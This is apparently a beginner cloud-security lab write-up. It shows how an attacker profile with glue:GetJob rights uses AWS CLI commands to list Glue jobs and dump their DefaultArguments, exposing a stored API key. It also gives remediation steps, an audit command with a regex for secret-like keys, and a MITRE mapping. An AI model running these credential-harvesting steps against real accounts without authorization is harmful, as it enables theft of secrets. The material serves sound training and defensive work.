# Glue Job — Secrets in DefaultArguments

**Difficulty:** Beginner | **Provider:** AWS | **Category:** Data / Secrets

## Scenario

An ETL team created an AWS Glue job that reads from a production database. To pass
the database credentials to the job, they added them directly to the job's
**DefaultArguments** — a key-value map that is part of the job definition returned
by `glue:GetJob` in plaintext.

Any IAM identity with `glue:GetJob` or `glue:GetJobs` can retrieve the full job
definition including all credential arguments.

## Attack Path

```
[Attacker] glue-reader-<id> (glue:GetJob + glue:ListJobs)
    |
    v
aws glue list-jobs  -->  find cumulonimbus-etl-* job
    |
    v
aws glue get-job --job-name <name>
    |
    v
Job.DefaultArguments["--api-key"]  -->  flag
```

### Step 1 — Configure the attacker profile

```bash
aws configure --profile attacker   # region: eu-west-1
```

### Step 2 — List Glue jobs

```bash
aws glue list-jobs \
  --profile attacker \
  --query "JobNames"
```

### Step 3 — Dump the job definition

```bash
JOB_NAME="<job_name>"

aws glue get-job \
  --job-name "${JOB_NAME}" \
  --profile attacker \
  --query "Job.DefaultArguments"
```

The `--api-key` entry contains the flag.

## How to Fix in Production

1. **Use AWS Secrets Manager or SSM Parameter Store** — store credentials there and
   pass only the secret ARN/path as a job argument. Retrieve the actual value at
   runtime inside the Glue script using `boto3`.
2. **Never store plaintext credentials in `DefaultArguments`** — they are visible
   to anyone with read access to the Glue service.
3. **Restrict `glue:GetJob`** to only the roles that need to manage or run the job —
   it is commonly granted broadly as part of "Glue read" policies.
4. **Audit existing jobs** for sensitive arguments:
   ```bash
   aws glue get-jobs --query "Jobs[*].{Name:Name,Args:DefaultArguments}" | \
     jq '.[] | select(.Args | to_entries[] | .key | test("(?i)(pass|key|secret|token|cred)"))'
   ```

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Unsecured Credentials: Credentials in Files | T1552.001 |
| Cloud Infrastructure Discovery | T1580 |
| Valid Accounts: Cloud Accounts | T1078.004 |
